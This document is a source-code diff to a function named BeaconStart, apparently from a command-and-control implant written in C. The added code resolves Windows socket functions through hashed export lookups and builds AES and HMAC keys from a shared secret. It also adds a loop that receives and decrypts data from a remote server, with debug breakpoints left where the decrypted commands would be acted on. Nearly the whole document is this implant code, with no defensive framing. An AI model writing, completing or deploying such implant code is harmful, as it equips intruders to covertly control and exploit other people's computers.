@@ -116,6 +116,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Str[0xa] = 0x0;
 
 		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
+		Ins.api.recv        = PeGetFuncEat( Ins.Module[2], H_RECV );
 		Ins.api.send        = PeGetFuncEat( Ins.Module[2], H_SEND );
 		Ins.api.WSAStartup  = PeGetFuncEat( Ins.Module[2], H_WSASTARTUP );
 		Ins.api.WSAConnect  = PeGetFuncEat( Ins.Module[2], H_WSACONNECT );
@@ -304,25 +305,48 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				AesMacKeyBuffer.Hdr.reserved = 0;
 				AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_AES_128;
 				AesMacKeyBuffer.Len          = 16;
-				RtlCopyMemory( AesMacKeyBuffer.Buf, Sum, 8 );
+				RtlCopyMemory( AesMacKeyBuffer.Buf, Sum + 0, 16 );
 
 				Ins.key[1].Ptr = &AesMacKeyBuffer;
-				Ins.key[2].Ptr = &AesMacKeyBuffer;
 				Ins.key[1].Len = sizeof( AesMacKeyBuffer );
-				Ins.key[2].Len = sizeof( AesMacKeyBuffer );
 
 				if ( CryptAesInit( &Ins ) )
 				{
+					AesMacKeyBuffer.Hdr.bType    = PLAINTEXTKEYBLOB;
+					AesMacKeyBuffer.Hdr.bVersion = CUR_BLOB_VERSION;
+					AesMacKeyBuffer.Hdr.reserved = 0;
 					AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_RC2; 
-					RtlCopyMemory( AesMacKeyBuffer.Buf, CPTR( UPTR( Sum ) + 8 ), 16 );
+					AesMacKeyBuffer.Len          = 16;
+					RtlCopyMemory( AesMacKeyBuffer.Buf, Sum + 1, 16 );
+
+					Ins.key[2].Ptr = &AesMacKeyBuffer;
+					Ins.key[2].Len = sizeof( AesMacKeyBuffer );
 
 					if ( CryptHmacInit( &Ins ) )
 					{
-						CryptHmacFree( &Ins ); __debugbreak();
+						PVOID AesBuf = NULL;
+						ULONG AesLen = 0;
+						PVOID TxtBuf = NULL;
+						ULONG TxtLen = 0;
+
+						do
+						{
+							if ( TransportRecv( &Ins, &TxtBuf, &TxtLen ) )
+							{
+								if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen ) )
+								{
+									__debugbreak();
+								};
+								Ins.api.LocalFree( TxtBuf );
+							};
+						} while ( TRUE );
+
+						CryptHmacFree( &Ins );
 					};
 					CryptAesFree( &Ins );
 				};
-				RtlSecureZeroMemory( &AesMacKeyBuffer, sizeof( AesMacKeyBuffer ) ); Ins.api.LocalFree( Sum );
+				RtlSecureZeroMemory( &AesMacKeyBuffer, sizeof( AesMacKeyBuffer ) ); 
+				Ins.api.LocalFree( Sum );
 			};
 		};
 
